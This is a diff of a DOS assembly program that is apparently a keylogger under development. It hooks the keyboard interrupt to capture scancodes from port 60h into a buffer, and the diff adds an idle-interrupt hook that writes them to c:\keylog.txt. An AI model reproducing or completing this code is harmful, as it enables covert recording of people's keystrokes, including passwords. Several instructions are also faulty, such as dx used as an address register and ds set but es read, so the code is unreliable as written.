@@ -1,4 +1,4 @@
-.286
+.186
 .model tiny
 .code 
 org 100h
@@ -6,26 +6,44 @@ locals @@
 
 Start:
 
-		mov dx, 9h * 4h ;addr of int 9h
-
-		xor ax, ax
-		mov ds, ax
-
-
 		cli
-		
+
+	;counting addr of int 9h
+		mov dx, 9h * 4h 
+		xor ax, ax
+		mov es, ax
+
 
 	;saving addr of old 9h
 		mov ax, word ptr es:[dx]  		
-		mov word ptr old_9h_o, dx 		;offset
+		mov word ptr old_9h_o, ax 		;offset
 		
-		mov ax, word ptr ds:[dx + 2]
-		mov word ptr old_9h_s, dx  		;segment
+		mov ax, word ptr es:[dx + 2]
+		mov word ptr old_9h_s, ax  		;segment
 
 
 	;rewriting addr of old 9h to new 9h in memory
-		mov ax, 2521h					
+		mov ax, 2509h					
 		mov dx, offset new_9h
+		int 21h
+
+
+	;counting addr of int 28h
+		mov dx, 28h * 4h 
+		xor ax, ax
+		mov ds, ax
+
+	;saving addr of old 28h
+		mov ax, word ptr es:[dx]
+		mov word ptr old_28h_o, ax
+
+		mov ax, word ptr es:[dx + 2d]
+		mov word ptr old_28h_s, ax
+
+
+	;rewriting addr of old 28h to new 28h in memory
+		mov ax, 2528h
+		mov dx, offset new_28h
 		int 21h
 
 
@@ -37,11 +55,27 @@ Start:
 		int 21h;
 
 
+new_28h proc
+		pushf
+		pusha
+		
+		call flush_buff
+
+		popa
+		popf
+
+		db 0eah
+		old_28h_o dw ?
+		old_28h_s dw ?
+
+		endp
+
+
 new_9h proc
 		pushf
 		pusha
 
-		
+		call read_to_buff	
 
 		popa
 		popf
@@ -65,13 +99,13 @@ proc read_to_buff
 	;saving pressed key
 		in al, 60h;	
 
-	;setting dl as head
-		mov dl, buff 	
-		add dl, buff_head
+	;setting dx as head
+		mov dx, offset buff 
+		add dx, buff_head
 	
-	;setting bl as tail
-		mov bl, buff 	
-		add bl, buff_tail
+	;setting bx as tail
+		mov bx, offset buff 	
+		add bx, buff_tail
 	
 	;writing pressed key to the buffer
 		mov cs:[bx], al
@@ -82,11 +116,11 @@ proc read_to_buff
 
 	;skipping key release
 		in al, 60h;
-		xor al, al
-
-	
+		xor al, al	
 
 		popa
+
+		ret
 		endp
 
 
@@ -148,16 +182,16 @@ proc flush_buff
 
 		popa    ;fixing regs
 
+		ret
 		endp
 
-log_file = db 'c:\keylog.txt', 0
-file_handler = db ?
+log_file: db 'c:\keylog.txt', 0
+file_handler: db ?
 
-cur_key db '33'
 
-buff db 256 dup (?)
-buff_head db 0 
-buff_tail db 0
+buff: db 256 dup (?)
+buff_head: db 0 
+buff_tail: db 0
 
 end_label:
 end Start
